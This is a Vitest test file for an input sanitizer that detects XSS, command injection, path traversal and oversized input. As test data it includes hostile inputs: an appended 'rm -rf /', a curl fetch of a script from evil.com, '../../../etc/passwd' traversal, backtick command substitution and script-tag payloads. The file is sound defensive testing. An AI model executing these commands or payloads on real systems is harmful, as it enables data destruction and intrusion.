/**
 * Tests for InputSanitizer
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { InputSanitizer, SanitizationOptions, SecurityIssue } from '../../../src/stdio/security/input-sanitizer.js';

describe('InputSanitizer', () => {
  describe('Basic Sanitization', () => {
    it('should pass through safe strings unchanged', () => {
      const result = InputSanitizer.sanitize('hello world');
      expect(result.isSafe).toBe(true);
      expect(result.sanitized).toBe('hello world');
      expect(result.issues).toHaveLength(0);
    });

    it('should handle null and undefined', () => {
      const nullResult = InputSanitizer.sanitize(null);
      expect(nullResult.isSafe).toBe(true);
      expect(nullResult.sanitized).toBe(null);

      const undefinedResult = InputSanitizer.sanitize(undefined);
      expect(undefinedResult.isSafe).toBe(true);
      expect(undefinedResult.sanitized).toBe(undefined);
    });

    it('should handle numbers and booleans', () => {
      const numResult = InputSanitizer.sanitize(42);
      expect(numResult.isSafe).toBe(true);
      expect(numResult.sanitized).toBe(42);

      const boolResult = InputSanitizer.sanitize(true);
      expect(boolResult.isSafe).toBe(true);
      expect(boolResult.sanitized).toBe(true);
    });

    it('should handle arrays', () => {
      const result = InputSanitizer.sanitize(['hello', 'world', 123]);
      expect(result.isSafe).toBe(true);
      expect(result.sanitized).toEqual(['hello', 'world', 123]);
    });

    it('should handle objects', () => {
      const result = InputSanitizer.sanitize({ name: 'test', value: 42 });
      expect(result.isSafe).toBe(true);
      expect(result.sanitized).toEqual({ name: 'test', value: 42 });
    });
  });

  describe('XSS Protection', () => {
    it('should detect and remove script tags', () => {
      const malicious = '<script>alert("xss")</script>';
      const result = InputSanitizer.sanitize(malicious);
      
      expect(result.isSafe).toBe(false);
      expect(result.sanitized).toBe('');
      expect(result.issues).toHaveLength(1);
      expect(result.issues[0].type).toBe('xss');
      expect(result.issues[0].severity).toBe('high');
    });

    it('should detect iframe tags', () => {
      const malicious = '<iframe src="evil.com"></iframe>';
      const result = InputSanitizer.sanitize(malicious);
      
      expect(result.isSafe).toBe(false);
      expect(result.issues.some(i => i.type === 'xss')).toBe(true);
    });

    it('should detect javascript: URLs', () => {
      const malicious = 'javascript:alert("xss")';
      const result = InputSanitizer.sanitize(malicious);
      
      expect(result.isSafe).toBe(false);
      expect(result.issues.some(i => i.type === 'xss')).toBe(true);
    });

    it('should detect event handlers', () => {
      const malicious = '<img onclick="alert(\'xss\')" src="test.jpg">';
      const result = InputSanitizer.sanitize(malicious);
      
      expect(result.isSafe).toBe(false);
      expect(result.issues.some(i => i.type === 'xss')).toBe(true);
    });

    it('should allow HTML when explicitly permitted', () => {
      const html = '<p>Hello <strong>world</strong></p>';
      const result = InputSanitizer.sanitize(html, { allowHtml: true });
      
      expect(result.isSafe).toBe(true);
      // Still removes dangerous tags even when HTML is allowed
      expect(result.sanitized).not.toContain('<script>');
    });
  });

  describe('Command Injection Protection', () => {
    it('should detect shell metacharacters in command args', () => {
      const args = ['file.txt; rm -rf /'];
      const result = InputSanitizer.sanitizeCommandArgs(args);
      
      expect(result.isSafe).toBe(false);
      expect(result.issues.some(i => i.type === 'command_injection')).toBe(true);
      expect(result.issues.some(i => i.severity === 'critical')).toBe(true);
    });

    it('should detect dangerous commands', () => {
      const args = ['curl', 'http://evil.com/script.sh'];
      const result = InputSanitizer.sanitizeCommandArgs(args);
      
      expect(result.isSafe).toBe(false);
      expect(result.issues.some(i => i.type === 'command_injection')).toBe(true);
    });

    it('should detect variable expansion', () => {
      const args = ['${HOME}/.bashrc'];
      const result = InputSanitizer.sanitizeCommandArgs(args);
      
      expect(result.isSafe).toBe(false);
      expect(result.issues.some(i => i.type === 'command_injection')).toBe(true);
    });

    it('should detect command substitution', () => {
      const args = ['`whoami`'];
      const result = InputSanitizer.sanitizeCommandArgs(args);
      
      expect(result.isSafe).toBe(false);
      expect(result.issues.some(i => i.type === 'command_injection')).toBe(true);
    });

    it('should allow safe command arguments', () => {
      const args = ['file.txt', '--verbose', '--output=result.txt'];
      const result = InputSanitizer.sanitizeCommandArgs(args);
      
      expect(result.isSafe).toBe(true);
      expect(result.sanitized).toEqual(args);
    });
  });

  describe('Path Traversal Protection', () => {
    it('should detect directory traversal', () => {
      const paths = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        '/etc/passwd',
        'file/../../../secret'
      ];

      paths.forEach(path => {
        const result = InputSanitizer.sanitizePath(path);
        expect(result.isSafe).toBe(false);
        expect(result.issues.some(i => i.type === 'path_traversal')).toBe(true);
      });
    });

    it('should detect null bytes', () => {
      const result = InputSanitizer.sanitizePath('file\x00.txt');
      expect(result.isSafe).toBe(false);
      expect(result.issues.some(i => i.type === 'path_traversal')).toBe(true);
    });

    it('should allow safe paths', () => {
      const safePaths = [
        'file.txt',
        'directory/subdirectory/file.txt',
        'normal-path_with-123.txt'
      ];

      safePaths.forEach(path => {
        const result = InputSanitizer.sanitizePath(path);
        expect(result.isSafe).toBe(true);
      });
    });
  });

  describe('File Content Sanitization', () => {
    it('should detect binary content in text files', () => {
      // Create content with more binary characters to trigger detection
      const binaryContent = '\x00\x01\x02\x03\x04\x05\x06\x07\x08'.repeat(10) + '\x0E\x0F\x10'.repeat(5);
      const result = InputSanitizer.sanitizeFileContent(binaryContent, 'test.txt');
      
      expect(result.isSafe).toBe(false);
      expect(result.issues.some(i => i.type === 'binary_content')).toBe(true);
    });

    it('should allow binary content when permitted', () => {
      const binaryContent = '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x0E\x0F\x10';
      const result = InputSanitizer.sanitizeFileContent(binaryContent, 'image.jpg', { allowBinary: true });
      
      expect(result.isSafe).toBe(true);
    });

    it('should detect dangerous code patterns', () => {
      const maliciousCode = 'eval("malicious code")';
      const result = InputSanitizer.sanitizeFileContent(maliciousCode, 'script.js');
      
      expect(result.issues.some(i => i.type === 'command_injection')).toBe(true);
    });

    it('should detect XSS patterns in HTML files', () => {
      const xssHtml = '<script>alert("xss")</script>';
      const result = InputSanitizer.sanitizeFileContent(xssHtml, 'page.html');
      
      expect(result.issues.some(i => i.type === 'xss')).toBe(true);
    });
  });

  describe('Metadata Sanitization', () => {
    it('should sanitize metadata keys and values', () => {
      const metadata = {
        'normal-key': 'normal-value',
        'key-with-<script>': 'value-with-evil',
        'another-key': '${HOME}/exploit'
      };

      const result = InputSanitizer.sanitizeMetadata(metadata);
      
      expect(result.issues.length).toBeGreaterThan(0);
      expect(result.sanitized).not.toHaveProperty('key-with-<script>');
    });

    it('should limit metadata size', () => {
      const largeMetadata = {};
      for (let i = 0; i < 150; i++) {
        largeMetadata[`key${i}`] = `value${i}`;
      }

      const result = InputSanitizer.sanitizeMetadata(largeMetadata);
      expect(result.issues.some(i => i.type === 'oversized')).toBe(true);
      expect(Object.keys(result.sanitized).length).toBeLessThanOrEqual(100);
    });
  });

  describe('Size and Depth Limits', () => {
    it('should limit string length', () => {
      const longString = 'a'.repeat(200000);
      const result = InputSanitizer.sanitize(longString, { maxLength: 1000 });
      
      expect(result.isSafe).toBe(false);
      expect(result.issues.some(i => i.type === 'oversized')).toBe(true);
    });

    it('should limit array size', () => {
      const largeArray = new Array(2000).fill('item');
      const result = InputSanitizer.sanitize(largeArray);
      
      expect(result.issues.some(i => i.type === 'oversized')).toBe(true);
      expect(result.sanitized.length).toBeLessThanOrEqual(1000);
    });

    it('should limit object property count', () => {
      const largeObject = {};
      for (let i = 0; i < 150; i++) {
        largeObject[`prop${i}`] = i;
      }

      const result = InputSanitizer.sanitize(largeObject);
      expect(result.issues.some(i => i.type === 'oversized')).toBe(true);
      expect(Object.keys(result.sanitized).length).toBeLessThanOrEqual(100);
    });
  });

  describe('Unicode Handling', () => {
    it('should normalize Unicode', () => {
      const unicodeString = 'café\u0301'; // Decomposed accent
      const result = InputSanitizer.sanitize(unicodeString);
      
      expect(result.isSafe).toBe(true);
      // Unicode normalization should preserve the visual representation
      // but may not always combine characters exactly as expected
      expect(result.sanitized).toMatch(/^caf[ée]/); // Should be some form of café
    });

    it('should remove control characters', () => {
      const stringWithControl = 'text\x00\x01\x02with\x08control';
      const result = InputSanitizer.sanitize(stringWithControl);
      
      expect(result.isSafe).toBe(true);
      expect(result.sanitized).toBe('textwithcontrol');
    });

    it('should handle invalid Unicode gracefully', () => {
      // This tests the fallback behavior when Unicode normalization fails
      const problematicString = '\uD800'; // Lone high surrogate
      const result = InputSanitizer.sanitize(problematicString);
      
      expect(result.issues.some(i => i.type === 'invalid_unicode')).toBe(true);
    });
  });

  describe('Custom Character Filtering', () => {
    it('should filter to allowed characters when specified', () => {
      const result = InputSanitizer.sanitize('abc123!@#', {
        allowedChars: /^[a-zA-Z0-9]+$/
      });
      
      expect(result.isSafe).toBe(true);
      expect(result.sanitized).toBe('abc123');
      expect(result.issues.some(i => i.type === 'invalid_unicode')).toBe(true);
    });
  });

  describe('Performance Considerations', () => {
    it('should handle large inputs efficiently', () => {
      const largeObject = {
        data: 'x'.repeat(50000),
        nested: {
          array: new Array(500).fill('item'),
          deep: {
            value: 'test'
          }
        }
      };

      const start = Date.now();
      const result = InputSanitizer.sanitize(largeObject);
      const duration = Date.now() - start;

      // Should complete within reasonable time (less than 100ms for this size)
      expect(duration).toBeLessThan(100);
      expect(result.isSafe).toBe(true);
    });

    it('should generate consistent hashes', () => {
      const input = { test: 'value', number: 42 };
      const result1 = InputSanitizer.sanitize(input);
      const result2 = InputSanitizer.sanitize(input);
      
      expect(result1.originalHash).toBe(result2.originalHash);
      expect(result1.originalHash).toBeDefined();
    });
  });

  describe('Edge Cases', () => {
    it('should handle circular references gracefully', () => {
      const circular: any = { name: 'test' };
      circular.self = circular;

      const result = InputSanitizer.sanitize(circular);
      expect(result.isSafe).toBe(false);
      expect(result.issues.some(i => i.type === 'deep_nesting')).toBe(true);
    });

    it('should handle very deep nesting', () => {
      let deep: any = 'leaf';
      for (let i = 0; i < 20; i++) {
        deep = { level: i, nested: deep };
      }

      const result = InputSanitizer.sanitize(deep);
      // Should still process but may have size warnings
      expect(result.sanitized).toBeDefined();
    });

    it('should handle special number values', () => {
      const specialNumbers = [NaN, Infinity, -Infinity];
      
      specialNumbers.forEach(num => {
        const result = InputSanitizer.sanitize(num);
        expect(result.isSafe).toBe(false);
        expect(result.issues.some(i => i.type === 'invalid_unicode')).toBe(true);
      });
    });

    it('should handle empty inputs', () => {
      const emptyInputs = ['', [], {}, null, undefined];
      
      emptyInputs.forEach(input => {
        const result = InputSanitizer.sanitize(input);
        expect(result.isSafe).toBe(true);
      });
    });
  });

  describe('Integration with Existing Security', () => {
    it('should complement JSON schema validation', () => {
      // This simulates input that passes schema validation but contains security issues
      const maliciousInput = {
        title: 'My Change <script>alert("xss")</script>',
        slug: 'test-change',
        rationale: 'This contains ${HOME} path reference'
      };

      const result = InputSanitizer.sanitize(maliciousInput);
      
      // Would pass schema validation but fail sanitization
      expect(result.isSafe).toBe(false);
      expect(result.issues.some(i => i.type === 'xss')).toBe(true);
    });

    it('should preserve safe data while removing threats', () => {
      const mixedInput = {
        safeField: 'This is safe',
        dangerousField: '<script>alert("xss")</script>',
        number: 42,
        array: ['safe', 'items']
      };

      const result = InputSanitizer.sanitize(mixedInput);
      
      expect(result.sanitized.safeField).toBe('This is safe');
      expect(result.sanitized.number).toBe(42);
      expect(result.sanitized.array).toEqual(['safe', 'items']);
      expect(result.sanitized.dangerousField).not.toContain('<script>');
    });
  });
});